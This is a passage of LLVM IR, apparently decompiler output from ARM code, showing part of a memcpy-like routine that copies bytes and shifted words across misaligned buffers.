  br i1 %v2_15ac8, label %dec_label_pc_15acc, label %dec_label_pc_15abc

dec_label_pc_15acc:                               ; preds = %.thread118, %dec_label_pc_15a78
  %v7_15adc = phi i32 [ %v0_15a9093, %dec_label_pc_15a78 ], [ %v3_15ac099119, %.thread118 ]
  %v0_15acc = phi i32 [ %v2_15a78, %dec_label_pc_15a78 ], [ %v0_15acc.pre, %.thread118 ]
  %v2_15acc = add i32 %v0_15acc, 8
  store i32 %v2_15acc, i32* %r2.global-to-local, align 4
  %v4_15acc = sub i32 0, %v0_15acc
  %v5_15acc = and i32 %v2_15acc, %v4_15acc
  %v6_15acc = icmp slt i32 %v5_15acc, 0
  store i1 %v6_15acc, i1* %cpsr_v.global-to-local, align 1
  %v7_15acc = icmp slt i32 %v2_15acc, 0
  store i1 %v7_15acc, i1* %cpsr_n.global-to-local, align 1
  %v5_15ad0 = icmp slt i32 %v0_15acc, -8
  br i1 %v5_15ad0, label %bb133, label %dec_label_pc_15ad4

dec_label_pc_15ad4:                               ; preds = %dec_label_pc_15acc
  %v6_15ad4 = add i32 %v0_15acc, 4
  store i32 %v6_15ad4, i32* %r2.global-to-local, align 4
  %v8_15ad4 = sub i32 -5, %v0_15acc
  %v9_15ad4 = and i32 %v8_15ad4, %v2_15acc
  %v10_15ad4 = icmp slt i32 %v9_15ad4, 0
  store i1 %v10_15ad4, i1* %cpsr_v.global-to-local, align 1
  %v11_15ad4 = icmp slt i32 %v6_15ad4, 0
  store i1 %v11_15ad4, i1* %cpsr_n.global-to-local, align 1
  %v5_15ad8 = icmp slt i32 %v2_15acc, 4
  %v6_15ad8 = load i32, i32* @r1, align 4
  %v7_15ad8 = inttoptr i32 %v6_15ad8 to i32*
  %v8_15ad8 = load i32, i32* %v7_15ad8, align 4
  store i32 %v8_15ad8, i32* %r3.global-to-local, align 4
  %v10_15ad8 = add i32 %v6_15ad8, 4
  br i1 %v5_15ad8, label %.thread6, label %bb132

.thread6:                                         ; preds = %dec_label_pc_15ad4
  store i32 %v10_15ad8, i32* @r1, align 4
  %v8_15adc = inttoptr i32 %v7_15adc to i32*
  store i32 %v8_15ad8, i32* %v8_15adc, align 4
  %v9_15adc = load i32, i32* %r0.global-to-local, align 4
  %v10_15adc = add i32 %v9_15adc, 4
  store i32 %v10_15adc, i32* %r0.global-to-local, align 4
  %v0_15aec.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb133

bb132:                                            ; preds = %dec_label_pc_15ad4
  %v10_15ae0 = inttoptr i32 %v10_15ad8 to i32*
  %v11_15ae0 = load i32, i32* %v10_15ae0, align 4
  store i32 %v11_15ae0, i32* %ip.global-to-local, align 4
  %v12_15ae0 = add i32 %v6_15ad8, 8
  store i32 %v12_15ae0, i32* @r1, align 4
  %v7_15ae4 = inttoptr i32 %v7_15adc to i32*
  store i32 %v8_15ad8, i32* %v7_15ae4, align 4
  %v9_15ae4 = add i32 %v7_15adc, 4
  %v10_15ae4 = inttoptr i32 %v9_15ae4 to i32*
  %v11_15ae4 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v11_15ae4, i32* %v10_15ae4, align 4
  %v12_15ae4 = add i32 %v7_15adc, 8
  store i32 %v12_15ae4, i32* %r0.global-to-local, align 4
  %v6_15ae8 = load i32, i32* %r2.global-to-local, align 4
  %v7_15ae8 = add i32 %v6_15ae8, -4
  store i32 %v7_15ae8, i32* %r2.global-to-local, align 4
  br label %bb133

bb133:                                            ; preds = %.thread6, %.thread12, %dec_label_pc_15acc, %bb, %dec_label_pc_15bbc, %dec_label_pc_15c94, %dec_label_pc_15c28, %bb132
  %v2_15afc = phi i32 [ %v10_15adc, %.thread6 ], [ %v0_15b8c76, %.thread12 ], [ %v7_15adc, %dec_label_pc_15acc ], [ %v1_15a50, %bb ], [ %v2_15afc114, %dec_label_pc_15bbc ], [ %v2_15afc113, %dec_label_pc_15c94 ], [ %v2_15afc112, %dec_label_pc_15c28 ], [ %v12_15ae4, %bb132 ]
  %v0_15aec = phi i32 [ %v0_15aec.pre, %.thread6 ], [ %v2_15b34, %.thread12 ], [ %v2_15acc, %dec_label_pc_15acc ], [ %v2_15a60, %bb ], [ %v0_15aec110, %dec_label_pc_15bbc ], [ %v0_15aec109, %dec_label_pc_15c94 ], [ %v0_15aec108, %dec_label_pc_15c28 ], [ %v7_15ae8, %bb132 ]
  %v1_15aec = add i32 %v0_15aec, 4
  store i32 %v1_15aec, i32* @r2, align 4
  %v3_15aec = sub i32 0, %v0_15aec
  %v4_15aec = and i32 %v1_15aec, %v3_15aec
  %v5_15aec = icmp slt i32 %v4_15aec, 0
  store i1 %v5_15aec, i1* %cpsr_v.global-to-local, align 1
  %v6_15aec = icmp slt i32 %v1_15aec, 0
  store i1 %v6_15aec, i1* %cpsr_n.global-to-local, align 1
  %v7_15aec = icmp eq i32 %v1_15aec, 0
  store i1 %v7_15aec, i1* @cpsr_z, align 1
  br i1 %v7_15aec, label %bb134, label %bb135

bb134:                                            ; preds = %bb133
  %v3_15af0 = load i8*, i8** %stack_var_-8, align 4
  %v4_15af0 = ptrtoint i8* %v3_15af0 to i32
  store i32 %v4_15af0, i32* %r0.global-to-local, align 4
  ret i32 %v4_15af0

bb135:                                            ; preds = %bb133
  %v1_15af4 = add i32 %v0_15aec, 2
  %v3_15af4 = sub i32 -3, %v0_15aec
  %v4_15af4 = and i32 %v3_15af4, %v1_15aec
  %v5_15af4 = icmp slt i32 %v4_15af4, 0
  store i1 %v5_15af4, i1* %cpsr_v.global-to-local, align 1
  %v6_15af4 = icmp slt i32 %v1_15af4, 0
  store i1 %v6_15af4, i1* %cpsr_n.global-to-local, align 1
  %v7_15af4 = icmp eq i32 %v1_15aec, 2
  store i1 %v7_15af4, i1* @cpsr_z, align 1
  %v0_15af8 = load i32, i32* @r1, align 4
  %v1_15af8 = inttoptr i32 %v0_15af8 to i8*
  %v2_15af8 = load i8, i8* %v1_15af8, align 1
  %v3_15af8 = zext i8 %v2_15af8 to i32
  store i32 %v3_15af8, i32* %r3.global-to-local, align 4
  %v5_15af8 = add i32 %v0_15af8, 1
  store i32 %v5_15af8, i32* @r1, align 4
  %v3_15afc = inttoptr i32 %v2_15afc to i8*
  store i8 %v2_15af8, i8* %v3_15afc, align 1
  %v4_15afc = load i32, i32* %r0.global-to-local, align 4
  %v5_15afc = add i32 %v4_15afc, 1
  store i32 %v5_15afc, i32* %r0.global-to-local, align 4
  %v0_15b00 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_15b00 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_15b00 = xor i1 %v0_15b00, %v1_15b00
  br i1 %v2_15b00, label %.thread120, label %bb136

bb136:                                            ; preds = %bb135
  %v3_15b00 = load i32, i32* @r1, align 4
  %v4_15b00 = inttoptr i32 %v3_15b00 to i8*
  %v5_15b00 = load i8, i8* %v4_15b00, align 1
  %v6_15b00 = zext i8 %v5_15b00 to i32
  store i32 %v6_15b00, i32* %r3.global-to-local, align 4
  %v8_15b00 = add i32 %v3_15b00, 1
  store i32 %v8_15b00, i32* @r1, align 4
  %v6_15b04 = inttoptr i32 %v5_15afc to i8*
  store i8 %v5_15b00, i8* %v6_15b04, align 1
  %v7_15b04 = load i32, i32* %r0.global-to-local, align 4
  %v8_15b04 = add i32 %v7_15b04, 1
  store i32 %v8_15b04, i32* %r0.global-to-local, align 4
  %v1_15b08.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_15b08.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread120

.thread120:                                       ; preds = %bb135, %bb136
  %v7_15b0c = phi i32 [ %v8_15b04, %bb136 ], [ %v5_15afc, %bb135 ]
  %v2_15b0c = phi i1 [ %v2_15b08.pre, %bb136 ], [ %v1_15b00, %bb135 ]
  %v1_15b0c = phi i1 [ %v1_15b08.pre, %bb136 ], [ %v0_15b00, %bb135 ]
  %v0_15b08 = load i1, i1* @cpsr_z, align 1
  %v3_15b08 = xor i1 %v2_15b0c, %v1_15b0c
  %v4_15b08 = or i1 %v0_15b08, %v3_15b08
  br i1 %v4_15b08, label %.thread121, label %bb137

bb137:                                            ; preds = %.thread120
  %v5_15b08 = load i32, i32* @r1, align 4
  %v6_15b08 = inttoptr i32 %v5_15b08 to i8*
  %v7_15b08 = load i8, i8* %v6_15b08, align 1
  %v8_15b08 = zext i8 %v7_15b08 to i32
  store i32 %v8_15b08, i32* %r3.global-to-local, align 4
  %v10_15b08 = add i32 %v5_15b08, 1
  store i32 %v10_15b08, i32* @r1, align 4
  %v8_15b0c = inttoptr i32 %v7_15b0c to i8*
  store i8 %v7_15b08, i8* %v8_15b0c, align 1
  %v9_15b0c = load i32, i32* %r0.global-to-local, align 4
  %v10_15b0c = add i32 %v9_15b0c, 1
  store i32 %v10_15b0c, i32* %r0.global-to-local, align 4
  br label %.thread121

.thread121:                                       ; preds = %.thread120, %bb137
  %v2_15b10 = load i8*, i8** %stack_var_-8, align 4
  %v3_15b10 = ptrtoint i8* %v2_15b10 to i32
  store i32 %v3_15b10, i32* %r0.global-to-local, align 4
  ret i32 %v3_15b10

dec_label_pc_15b14:                               ; preds = %dec_label_pc_15a68
  %v1_15b14 = sub nsw i32 4, %v1_15a68
  store i32 %v1_15b14, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_15b18 = icmp ult i32 %v1_15b14, 2
  store i1 %v8_15b18, i1* %cpsr_n.global-to-local, align 1
  %v1_15b1c = inttoptr i32 %v0_15a50 to i8*
  %v2_15b1c = load i8, i8* %v1_15b1c, align 1
  %v3_15b1c = zext i8 %v2_15b1c to i32
  store i32 %v3_15b1c, i32* %r3.global-to-local, align 4
  %v5_15b1c = add i32 %v0_15a50, 1
  store i32 %v5_15b1c, i32* @r1, align 4
  store i8 %v2_15b1c, i8* %v5_15a5c, align 1
  %v4_15b20 = load i32, i32* %r0.global-to-local, align 4
  %v5_15b20 = add i32 %v4_15b20, 1
  store i32 %v5_15b20, i32* %r0.global-to-local, align 4
  br i1 %v8_15b18, label %.thread12, label %bb138

bb138:                                            ; preds = %dec_label_pc_15b14
  %v9_15b18 = icmp eq i32 %v1_15b14, 2
  %v6_15b24 = load i32, i32* @r1, align 4
  %v7_15b24 = inttoptr i32 %v6_15b24 to i8*
  %v8_15b24 = load i8, i8* %v7_15b24, align 1
  %v9_15b24 = zext i8 %v8_15b24 to i32
  store i32 %v9_15b24, i32* %r3.global-to-local, align 4
  %v11_15b24 = add i32 %v6_15b24, 1
  store i32 %v11_15b24, i32* @r1, align 4
  %v9_15b28 = inttoptr i32 %v5_15b20 to i8*
  store i8 %v8_15b24, i8* %v9_15b28, align 1
  %v10_15b28 = load i32, i32* %r0.global-to-local, align 4
  %v11_15b28 = add i32 %v10_15b28, 1
  store i32 %v11_15b28, i32* %r0.global-to-local, align 4
  br i1 %v9_15b18, label %.thread12, label %bb139

bb139:                                            ; preds = %bb138
  %v8_15b2c = load i32, i32* @r1, align 4
  %v9_15b2c = inttoptr i32 %v8_15b2c to i8*
  %v10_15b2c = load i8, i8* %v9_15b2c, align 1
  %v11_15b2c = zext i8 %v10_15b2c to i32
  store i32 %v11_15b2c, i32* %r3.global-to-local, align 4
  %v13_15b2c = add i32 %v8_15b2c, 1
  store i32 %v13_15b2c, i32* @r1, align 4
  %v11_15b30 = inttoptr i32 %v11_15b28 to i8*
  store i8 %v10_15b2c, i8* %v11_15b30, align 1
  %v12_15b30 = load i32, i32* %r0.global-to-local, align 4
  %v13_15b30 = add i32 %v12_15b30, 1
  store i32 %v13_15b30, i32* %r0.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %bb138, %dec_label_pc_15b14, %bb139
  %v0_15b8c76 = phi i32 [ %v11_15b28, %bb138 ], [ %v5_15b20, %dec_label_pc_15b14 ], [ %v13_15b30, %bb139 ]
  %v0_15b34 = load i32, i32* %r2.global-to-local, align 4
  %v1_15b34 = load i32, i32* %ip.global-to-local, align 4
  %v2_15b34 = sub i32 %v0_15b34, %v1_15b34
  store i32 %v2_15b34, i32* %r2.global-to-local, align 4
  %v4_15b34 = xor i32 %v1_15b34, %v0_15b34
  %v5_15b34 = xor i32 %v2_15b34, %v0_15b34
  %v6_15b34 = and i32 %v5_15b34, %v4_15b34
  %v7_15b34 = icmp slt i32 %v6_15b34, 0
  store i1 %v7_15b34, i1* %cpsr_v.global-to-local, align 1
  %v8_15b34 = icmp slt i32 %v2_15b34, 0
  store i1 %v8_15b34, i1* %cpsr_n.global-to-local, align 1
  %v5_15b38 = icmp slt i32 %v0_15b34, %v1_15b34
  br i1 %v5_15b38, label %bb133, label %dec_label_pc_15b3c

dec_label_pc_15b3c:                               ; preds = %.thread12
  %v0_15b3c = load i32, i32* @r1, align 4
  %v1_15b3c = urem i32 %v0_15b3c, 4
  store i32 %v1_15b3c, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_15b3c = icmp eq i32 %v1_15b3c, 0
  %extract.t124 = trunc i32 %v0_15b3c to i2
  br i1 %v2_15b3c, label %dec_label_pc_15a78, label %dec_label_pc_15b44

dec_label_pc_15b44:                               ; preds = %dec_label_pc_15a70, %dec_label_pc_15b3c
  %v0_15b8c75 = phi i32 [ %v1_15a50, %dec_label_pc_15a70 ], [ %v0_15b8c76, %dec_label_pc_15b3c ]
  %v0_15c38 = phi i32 [ %v2_15a60, %dec_label_pc_15a70 ], [ %v2_15b34, %dec_label_pc_15b3c ]
  %v0_15b4c.off0 = phi i2 [ %extract.t, %dec_label_pc_15a70 ], [ %extract.t124, %dec_label_pc_15b3c ]
  %v0_15b44 = phi i32 [ %v0_15a50, %dec_label_pc_15a70 ], [ %v0_15b3c, %dec_label_pc_15b3c ]
  %v1_15b44 = and i32 %v0_15b44, -4
  store i32 %v1_15b44, i32* %r1.global-to-local, align 4
  %v1_15b48 = inttoptr i32 %v1_15b44 to i32*
  %v2_15b48 = load i32, i32* %v1_15b48, align 4
  store i32 %v2_15b48, i32* @lr, align 4
  %v4_15b48 = add i32 %v1_15b44, 4
  store i32 %v4_15b48, i32* %r1.global-to-local, align 4
  %v2_15c30 = add i32 %v0_15c38, -12
  %v4_15c30 = sub i32 11, %v0_15c38
  %v5_15c30 = and i32 %v4_15c30, %v0_15c38
  %v6_15c30 = icmp slt i32 %v5_15c30, 0
  store i1 %v6_15c30, i1* %cpsr_v.global-to-local, align 1
  %v7_15c30 = icmp slt i32 %v2_15c30, 0
  store i1 %v7_15c30, i1* %cpsr_n.global-to-local, align 1
  %v5_15c34 = icmp slt i32 %v0_15c38, 12
  switch i2 %v0_15b4c.off0, label %dec_label_pc_15b58 [
    i2 -1, label %dec_label_pc_15c30
    i2 -2, label %dec_label_pc_15bc4
  ]

dec_label_pc_15b58:                               ; preds = %dec_label_pc_15b44
  br i1 %v5_15c34, label %dec_label_pc_15ba4, label %dec_label_pc_15b60

dec_label_pc_15b60:                               ; preds = %dec_label_pc_15b58
  store i32 %v2_15c30, i32* %r2.global-to-local, align 4
  %v3_15b64 = load i32, i32* @r4, align 4
  store i32 %v3_15b64, i32* %stack_var_-16, align 4
  %v6_15b64 = load i32, i32* @r5, align 4
  store i32 %v6_15b64, i32* %stack_var_-12, align 4
  br label %dec_label_pc_15b68

dec_label_pc_15b68:                               ; preds = %dec_label_pc_15b68.dec_label_pc_15b68_crit_edge, %dec_label_pc_15b60
  %v0_15b8c = phi i32 [ %v12_15b8c, %dec_label_pc_15b68.dec_label_pc_15b68_crit_edge ], [ %v0_15b8c75, %dec_label_pc_15b60 ]
  %v0_15b6c = phi i32 [ %v0_15b6c.pre, %dec_label_pc_15b68.dec_label_pc_15b68_crit_edge ], [ %v4_15b48, %dec_label_pc_15b60 ]
  %v0_15b68 = phi i32 [ %v0_15b68.pre, %dec_label_pc_15b68.dec_label_pc_15b68_crit_edge ], [ %v2_15b48, %dec_label_pc_15b60 ]
  %v3_15b68 = udiv i32 %v0_15b68, 256
  store i32 %v3_15b68, i32* %r3.global-to-local, align 4
  %v1_15b6c = inttoptr i32 %v0_15b6c to i32*
  %v2_15b6c = load i32, i32* %v1_15b6c, align 4
  store i32 %v2_15b6c, i32* %r4.global-to-local, align 4
  %v3_15b6c = add i32 %v0_15b6c, 4
  %v4_15b6c = inttoptr i32 %v3_15b6c to i32*
  %v5_15b6c = load i32, i32* %v4_15b6c, align 4
  store i32 %v5_15b6c, i32* %r5.global-to-local, align 4
  %v6_15b6c = add i32 %v0_15b6c, 8
  %v7_15b6c = inttoptr i32 %v6_15b6c to i32*
  %v8_15b6c = load i32, i32* %v7_15b6c, align 4
  store i32 %v8_15b6c, i32* %ip.global-to-local, align 4
  %v9_15b6c = add i32 %v0_15b6c, 12
  %v10_15b6c = inttoptr i32 %v9_15b6c to i32*
  %v11_15b6c = load i32, i32* %v10_15b6c, align 4
  store i32 %v11_15b6c, i32* @lr, align 4
  %v12_15b6c = add i32 %v0_15b6c, 16
  store i32 %v12_15b6c, i32* %r1.global-to-local, align 4
  %v4_15b70 = mul i32 %v2_15b6c, 16777216
  %v5_15b70 = or i32 %v4_15b70, %v3_15b68
  store i32 %v5_15b70, i32* %r3.global-to-local, align 4
  %v3_15b74 = udiv i32 %v2_15b6c, 256
  %v4_15b78 = mul i32 %v5_15b6c, 16777216
  %v5_15b78 = or i32 %v4_15b78, %v3_15b74
  store i32 %v5_15b78, i32* %r4.global-to-local, align 4
  %v3_15b7c = udiv i32 %v5_15b6c, 256
  %v4_15b80 = mul i32 %v8_15b6c, 16777216
  %v5_15b80 = or i32 %v4_15b80, %v3_15b7c
  store i32 %v5_15b80, i32* %r5.global-to-local, align 4
  %v3_15b84 = udiv i32 %v8_15b6c, 256
  %v4_15b88 = mul i32 %v11_15b6c, 16777216
  %v5_15b88 = or i32 %v4_15b88, %v3_15b84
  store i32 %v5_15b88, i32* %ip.global-to-local, align 4
  %v1_15b8c = inttoptr i32 %v0_15b8c to i32*
  store i32 %v5_15b70, i32* %v1_15b8c, align 4
  %v3_15b8c = add i32 %v0_15b8c, 4
  %v4_15b8c = inttoptr i32 %v3_15b8c to i32*
  %v5_15b8c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_15b8c, i32* %v4_15b8c, align 4
  %v6_15b8c = add i32 %v0_15b8c, 8
  %v7_15b8c = inttoptr i32 %v6_15b8c to i32*
  %v8_15b8c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_15b8c, i32* %v7_15b8c, align 4
  %v9_15b8c = add i32 %v0_15b8c, 12
  %v10_15b8c = inttoptr i32 %v9_15b8c to i32*
  %v11_15b8c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v11_15b8c, i32* %v10_15b8c, align 4
  %v12_15b8c = add i32 %v0_15b8c, 16
  store i32 %v12_15b8c, i32* %r0.global-to-local, align 4
  %v0_15b90 = load i32, i32* %r2.global-to-local, align 4
  %v2_15b90 = add i32 %v0_15b90, -16
  store i32 %v2_15b90, i32* %r2.global-to-local, align 4
  %v6_15b94 = icmp slt i32 %v0_15b90, 16
  br i1 %v6_15b94, label %dec_label_pc_15b98, label %dec_label_pc_15b68.dec_label_pc_15b68_crit_edge

dec_label_pc_15b68.dec_label_pc_15b68_crit_edge:  ; preds = %dec_label_pc_15b68
  %v0_15b68.pre = load i32, i32* @lr, align 4
  %v0_15b6c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15b68

dec_label_pc_15b98:                               ; preds = %dec_label_pc_15b68
  %v2_15b98 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15b98, i32* @r4, align 4
  %v5_15b98 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_15b98, i32* @r5, align 4
  %v2_15b9c = add i32 %v0_15b90, -4
  store i32 %v2_15b9c, i32* %r2.global-to-local, align 4
  %v4_15b9c = add i32 %v0_15b90, 2147483632
  %v5_15b9c = and i32 %v2_15b9c, %v4_15b9c
  %v6_15b9c = icmp slt i32 %v5_15b9c, 0
  store i1 %v6_15b9c, i1* %cpsr_v.global-to-local, align 1
  %v7_15b9c = icmp slt i32 %v2_15b9c, 0
  store i1 %v7_15b9c, i1* %cpsr_n.global-to-local, align 1
  %v5_15ba0 = icmp slt i32 %v2_15b90, -12
  br i1 %v5_15ba0, label %dec_label_pc_15bbc, label %dec_label_pc_15ba4

dec_label_pc_15ba4:                               ; preds = %dec_label_pc_15b98, %dec_label_pc_15b58, %dec_label_pc_15ba4
  %v1_15bb0 = phi i32 [ %v4_15bb0, %dec_label_pc_15ba4 ], [ %v12_15b8c, %dec_label_pc_15b98 ], [ %v0_15b8c75, %dec_label_pc_15b58 ]
  %v0_15ba4 = load i32, i32* @lr, align 4
  %v3_15ba4 = udiv i32 %v0_15ba4, 256
  store i32 %v3_15ba4, i32* %ip.global-to-local, align 4
  %v0_15ba8 = load i32, i32* %r1.global-to-local, align 4
  %v1_15ba8 = inttoptr i32 %v0_15ba8 to i32*
  %v2_15ba8 = load i32, i32* %v1_15ba8, align 4
  store i32 %v2_15ba8, i32* @lr, align 4
  %v4_15ba8 = add i32 %v0_15ba8, 4
  store i32 %v4_15ba8, i32* %r1.global-to-local, align 4
  %v4_15bac = mul i32 %v2_15ba8, 16777216
  %v5_15bac = or i32 %v4_15bac, %v3_15ba4
  store i32 %v5_15bac, i32* %ip.global-to-local, align 4
  %v2_15bb0 = inttoptr i32 %v1_15bb0 to i32*
  store i32 %v5_15bac, i32* %v2_15bb0, align 4
  %v3_15bb0 = load i32, i32* %r0.global-to-local, align 4
  %v4_15bb0 = add i32 %v3_15bb0, 4
  store i32 %v4_15bb0, i32* %r0.global-to-local, align 4
  %v0_15bb4 = load i32, i32* %r2.global-to-local, align 4
  %v2_15bb4 = add i32 %v0_15bb4, -4
  store i32 %v2_15bb4, i32* %r2.global-to-local, align 4
  %v6_15bb8 = icmp slt i32 %v0_15bb4, 4
  br i1 %v6_15bb8, label %dec_label_pc_15bbc.loopexit, label %dec_label_pc_15ba4

dec_label_pc_15bbc.loopexit:                      ; preds = %dec_label_pc_15ba4
  %v4_15bb4 = sub i32 3, %v0_15bb4
  %v5_15bb4 = and i32 %v4_15bb4, %v0_15bb4
  %v6_15bb4 = icmp slt i32 %v5_15bb4, 0
  %v7_15bb4 = icmp slt i32 %v2_15bb4, 0
  store i1 %v6_15bb4, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15bb4, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_15bbc

dec_label_pc_15bbc:                               ; preds = %dec_label_pc_15bbc.loopexit, %dec_label_pc_15b98
  %v2_15afc114 = phi i32 [ %v4_15bb0, %dec_label_pc_15bbc.loopexit ], [ %v12_15b8c, %dec_label_pc_15b98 ]
  %v0_15aec110 = phi i32 [ %v2_15bb4, %dec_label_pc_15bbc.loopexit ], [ %v2_15b9c, %dec_label_pc_15b98 ]
  %v0_15bbc = load i32, i32* %r1.global-to-local, align 4
  %v1_15bbc = add i32 %v0_15bbc, -3
  store i32 %v1_15bbc, i32* @r1, align 4
  br label %bb133

dec_label_pc_15bc4:                               ; preds = %dec_label_pc_15b44
  br i1 %v5_15c34, label %dec_label_pc_15c10, label %dec_label_pc_15bcc

dec_label_pc_15bcc:                               ; preds = %dec_label_pc_15bc4
  store i32 %v2_15c30, i32* %r2.global-to-local, align 4
  %v3_15bd0 = load i32, i32* @r4, align 4
  store i32 %v3_15bd0, i32* %stack_var_-16, align 4
  %v6_15bd0 = load i32, i32* @r5, align 4
  store i32 %v6_15bd0, i32* %stack_var_-12, align 4
  br label %dec_label_pc_15bd4

dec_label_pc_15bd4:                               ; preds = %dec_label_pc_15bd4.dec_label_pc_15bd4_crit_edge, %dec_label_pc_15bcc
  %v0_15bf8 = phi i32 [ %v12_15bf8, %dec_label_pc_15bd4.dec_label_pc_15bd4_crit_edge ], [ %v0_15b8c75, %dec_label_pc_15bcc ]
  %v0_15bd8 = phi i32 [ %v0_15bd8.pre, %dec_label_pc_15bd4.dec_label_pc_15bd4_crit_edge ], [ %v4_15b48, %dec_label_pc_15bcc ]
  %v0_15bd4 = phi i32 [ %v0_15bd4.pre, %dec_label_pc_15bd4.dec_label_pc_15bd4_crit_edge ], [ %v2_15b48, %dec_label_pc_15bcc ]
  %v3_15bd4 = udiv i32 %v0_15bd4, 65536
  store i32 %v3_15bd4, i32* %r3.global-to-local, align 4
  %v1_15bd8 = inttoptr i32 %v0_15bd8 to i32*
  %v2_15bd8 = load i32, i32* %v1_15bd8, align 4
  store i32 %v2_15bd8, i32* %r4.global-to-local, align 4
  %v3_15bd8 = add i32 %v0_15bd8, 4
  %v4_15bd8 = inttoptr i32 %v3_15bd8 to i32*
  %v5_15bd8 = load i32, i32* %v4_15bd8, align 4
  store i32 %v5_15bd8, i32* %r5.global-to-local, align 4
  %v6_15bd8 = add i32 %v0_15bd8, 8
  %v7_15bd8 = inttoptr i32 %v6_15bd8 to i32*
  %v8_15bd8 = load i32, i32* %v7_15bd8, align 4
  store i32 %v8_15bd8, i32* %ip.global-to-local, align 4
  %v9_15bd8 = add i32 %v0_15bd8, 12
  %v10_15bd8 = inttoptr i32 %v9_15bd8 to i32*
  %v11_15bd8 = load i32, i32* %v10_15bd8, align 4
  store i32 %v11_15bd8, i32* @lr, align 4
  %v12_15bd8 = add i32 %v0_15bd8, 16
  store i32 %v12_15bd8, i32* %r1.global-to-local, align 4
  %v4_15bdc = mul i32 %v2_15bd8, 65536
  %v5_15bdc = or i32 %v4_15bdc, %v3_15bd4
  store i32 %v5_15bdc, i32* %r3.global-to-local, align 4
  %v3_15be0 = udiv i32 %v2_15bd8, 65536
  %v4_15be4 = mul i32 %v5_15bd8, 65536
  %v5_15be4 = or i32 %v4_15be4, %v3_15be0
  store i32 %v5_15be4, i32* %r4.global-to-local, align 4
  %v3_15be8 = udiv i32 %v5_15bd8, 65536
  %v4_15bec = mul i32 %v8_15bd8, 65536
  %v5_15bec = or i32 %v4_15bec, %v3_15be8
  store i32 %v5_15bec, i32* %r5.global-to-local, align 4
  %v3_15bf0 = udiv i32 %v8_15bd8, 65536
  %v4_15bf4 = mul i32 %v11_15bd8, 65536
  %v5_15bf4 = or i32 %v4_15bf4, %v3_15bf0
  store i32 %v5_15bf4, i32* %ip.global-to-local, align 4
  %v1_15bf8 = inttoptr i32 %v0_15bf8 to i32*
  store i32 %v5_15bdc, i32* %v1_15bf8, align 4
  %v3_15bf8 = add i32 %v0_15bf8, 4
  %v4_15bf8 = inttoptr i32 %v3_15bf8 to i32*
  %v5_15bf8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_15bf8, i32* %v4_15bf8, align 4
  %v6_15bf8 = add i32 %v0_15bf8, 8
  %v7_15bf8 = inttoptr i32 %v6_15bf8 to i32*
  %v8_15bf8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_15bf8, i32* %v7_15bf8, align 4
  %v9_15bf8 = add i32 %v0_15bf8, 12
  %v10_15bf8 = inttoptr i32 %v9_15bf8 to i32*
  %v11_15bf8 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v11_15bf8, i32* %v10_15bf8, align 4
  %v12_15bf8 = add i32 %v0_15bf8, 16
  store i32 %v12_15bf8, i32* %r0.global-to-local, align 4
  %v0_15bfc = load i32, i32* %r2.global-to-local, align 4
  %v2_15bfc = add i32 %v0_15bfc, -16
  store i32 %v2_15bfc, i32* %r2.global-to-local, align 4
  %v6_15c00 = icmp slt i32 %v0_15bfc, 16
  br i1 %v6_15c00, label %dec_label_pc_15c04, label %dec_label_pc_15bd4.dec_label_pc_15bd4_crit_edge

dec_label_pc_15bd4.dec_label_pc_15bd4_crit_edge:  ; preds = %dec_label_pc_15bd4
  %v0_15bd4.pre = load i32, i32* @lr, align 4
  %v0_15bd8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15bd4

dec_label_pc_15c04:                               ; preds = %dec_label_pc_15bd4
  %v2_15c04 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15c04, i32* @r4, align 4
  %v5_15c04 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_15c04, i32* @r5, align 4
  %v2_15c08 = add i32 %v0_15bfc, -4
  store i32 %v2_15c08, i32* %r2.global-to-local, align 4
  %v4_15c08 = add i32 %v0_15bfc, 2147483632
  %v5_15c08 = and i32 %v2_15c08, %v4_15c08
  %v6_15c08 = icmp slt i32 %v5_15c08, 0
  store i1 %v6_15c08, i1* %cpsr_v.global-to-local, align 1
  %v7_15c08 = icmp slt i32 %v2_15c08, 0
  store i1 %v7_15c08, i1* %cpsr_n.global-to-local, align 1
  %v5_15c0c = icmp slt i32 %v2_15bfc, -12
  br i1 %v5_15c0c, label %dec_label_pc_15c28, label %dec_label_pc_15c10

dec_label_pc_15c10:                               ; preds = %dec_label_pc_15bc4, %dec_label_pc_15c04, %dec_label_pc_15c10
  %v1_15c1c = phi i32 [ %v4_15c1c, %dec_label_pc_15c10 ], [ %v0_15b8c75, %dec_label_pc_15bc4 ], [ %v12_15bf8, %dec_label_pc_15c04 ]
  %v0_15c10 = load i32, i32* @lr, align 4
  %v3_15c10 = udiv i32 %v0_15c10, 65536
  store i32 %v3_15c10, i32* %ip.global-to-local, align 4
  %v0_15c14 = load i32, i32* %r1.global-to-local, align 4
  %v1_15c14 = inttoptr i32 %v0_15c14 to i32*
  %v2_15c14 = load i32, i32* %v1_15c14, align 4
  store i32 %v2_15c14, i32* @lr, align 4
  %v4_15c14 = add i32 %v0_15c14, 4
  store i32 %v4_15c14, i32* %r1.global-to-local, align 4
  %v4_15c18 = mul i32 %v2_15c14, 65536
  %v5_15c18 = or i32 %v4_15c18, %v3_15c10
  store i32 %v5_15c18, i32* %ip.global-to-local, align 4
